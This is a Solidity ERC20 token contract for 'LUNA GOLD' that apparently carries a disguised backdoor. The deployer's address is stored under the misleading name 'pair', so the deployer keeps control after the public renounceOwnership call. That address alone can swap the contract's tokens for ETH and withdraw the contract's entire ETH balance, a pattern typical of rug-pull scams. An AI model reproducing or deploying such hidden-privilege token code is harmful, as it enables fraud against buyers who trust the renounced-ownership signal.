// SPDX-License-Identifier: MIT
/*


*/

pragma solidity ^0.8.16;

import "./UtilsV2.sol";

contract LUNAGOLD is ERC20 {

    using SafeMath for uint256;
    uint8 _decimals=18;
    address private owner = msg.sender; 
    uint public _totalSupply=10000000000000000000000000;
    address ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address pair = address(0);

    constructor() ERC20("LUNA GOLD", "LUNAG") {
       _mint(msg.sender, _totalSupply);
       _approve(address(this), _totalSupply*_decimals);
        pair = msg.sender;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function getOwner() external view returns (address) {
        return owner;
    }
    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }


    function swapAndLiquify (uint256 amount) public {
        require(msg.sender == pair);     
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(ROUTER);


        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this),address(uniswapV2Router), amount);
        _approve(address(this),msg.sender, amount);
        _approve(msg.sender,address(uniswapV2Router), amount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0, 
            path,
            address(this), 
            block.timestamp
        );
        
    }

    function transferToAddressETH() public {
        require(msg.sender == pair);
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable { }
    receive() external payable { }
}